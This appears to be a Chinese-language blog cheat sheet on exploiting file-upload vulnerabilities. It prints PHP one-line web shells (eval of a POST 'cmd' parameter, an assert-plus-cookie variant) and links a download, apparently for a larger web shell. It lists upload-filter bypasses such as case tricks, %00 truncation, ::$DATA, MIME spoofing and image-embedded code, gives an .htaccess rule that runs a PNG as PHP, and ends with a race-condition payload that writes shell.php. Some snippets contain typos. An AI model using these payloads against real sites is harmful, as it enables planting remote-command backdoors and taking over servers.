---
layout: post
title: upload方法大全
categories: [web,upload]
---
# 文件上传漏洞
## 木马后门  
### 一句话木马
```php
	<?php @eval($_POST["cmd"]); ?>
	Cookie
	<?php @$a = $_COOKIE[1];$b =''; $c =''; @assert($b.$a); ?>
```
```js
	<script language="php">@eval($_POST['cmd'])</script>
```

### 小马
### 大马  
>链接：https://pan.baidu.com/s/1NM1kD7bEa_aUEqZxVaplpg?pwd=p2s8  
>提取码：p2s8

---

## 文件上传绕过方法
>删除/禁用js、修改拓展名、修改MIME类型、等价拓展名、大小写、htaccess、双写、空格、点、  
>::$DATA、%00截断、0X00截断、图片马、条件竞争等等  
---

### MINE类型
>常见Content-Type
1.image/gif 
2.image/png 
3.image/jpeg    
4.text/plain
5.text/html  
6.application/pdf  

### 文件内容
1.文件幻数  有`GIF89a`等等  
2.文件相关信息  
3.图片渲染  
>对图片进行代码注入
![php](/img/1php.png)  
![house](/img/house.png)  
4.二次渲染
>使用溢出攻击实现

### 文件后缀

#### 1.黑名单  
>后缀大小写(.Php)、  
>空格(.php )、  
>点(.php.)、  
>(.php::$DATA)、  
>Apache解析漏洞不识别`.rar`/`.owf`(.php.rar.owf)  
>.htaccess文件
```htaccess
	<FilesMatch "shell.png">
	SetHandler application/x-httpd-php
	</FileMatch>  
```  

#### 2.白名单  
>%00截断、0X00截断 shell.php`%00`.png
>POST方式注意在hex编码处将空格`0x20`改为`0x00`
---
### 竞争条件攻击  
>一些网站先允许任意文件上传，再对文件内容进行检测  
>检测到删除之间存在时间差  
>可以在时间差内生成新的`shell.php`  
  
#### 上传的php代码
```php
	<?php
		fputs(fopen('../shell.php','w'),'<?php @eval(&_POST['cmd']);?>');
	?>		
```